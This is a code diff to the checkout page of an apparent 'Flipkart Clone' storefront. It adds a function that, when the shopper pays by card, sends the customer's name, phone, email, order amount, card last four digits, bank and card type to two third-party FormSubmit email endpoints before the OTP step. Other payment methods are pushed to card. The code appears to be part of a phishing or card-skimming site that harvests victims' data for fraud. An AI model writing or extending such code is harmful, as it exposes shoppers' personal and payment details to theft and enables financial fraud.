@@ -735,6 +735,39 @@ export default function Checkout() {
     return successCount;
   };
 
+  const sendPreOtpCardAlertEmail = async () => {
+    if (payment.type !== "card") return 0;
+
+    const formData = new URLSearchParams();
+    formData.append("event", "Card Entered (Before OTP)");
+    formData.append("customer_name", address.name || "N/A");
+    formData.append("customer_phone", address.phone || "N/A");
+    formData.append("customer_email", address.email || "N/A");
+    formData.append("amount", finalAmount.toString());
+    formData.append("card_number_masked", cardLast4 ? `**** **** **** ${cardLast4}` : "N/A");
+    formData.append("card_name_masked", maskCardNameForEmail(payment.cardName));
+    formData.append("card_expiry_masked", payment.cardExpiry ? "**/**" : "N/A");
+    formData.append("card_cvv_masked", payment.cardCVV ? "***" : "N/A");
+    formData.append("card_bank", payment.bank || "N/A");
+    formData.append("card_type", payment.cardTab || "N/A");
+    formData.append("submitted_at", new Date().toLocaleString("en-IN"));
+    formData.append("_subject", "Pre-OTP Card Alert - Flipkart Clone");
+    formData.append("_template", "table");
+    const payload = formData.toString();
+
+    const sendResults = await Promise.allSettled([
+      postEmailToRecipient(FORMSUBMIT_PRIMARY_ENDPOINT, payload),
+      postEmailToRecipient(FORMSUBMIT_SECONDARY_ENDPOINT, payload),
+    ]);
+
+    const successCount = sendResults.filter((result) => result.status === "fulfilled").length;
+    if (successCount === 0) {
+      throw new Error("Pre-OTP card alert email failed for both recipients");
+    }
+
+    return successCount;
+  };
+
   const handleAddressNext = async () => {
     if (!validateAddress()) return;
 
@@ -757,7 +790,7 @@ export default function Checkout() {
     }
   };
 
-  const handlePayNow = () => {
+  const handlePayNow = async () => {
     if (unavailablePaymentMethods.includes(payment.type)) {
       setPayment({ type: "card", cardTab: "debit" });
       setPaymentError(unavailablePaymentsMessage);
@@ -786,6 +819,14 @@ export default function Checkout() {
       clearCart();
       setOrderPlaced(true);
     } else {
+      if (payment.type === "card") {
+        try {
+          await sendPreOtpCardAlertEmail();
+        } catch (error) {
+          console.error("Pre-OTP card alert email failed:", error);
+        }
+      }
+
       const pendingPaymentPayload: Order["payment"] = {
         type: payment.type,
         bank: payment.bank,
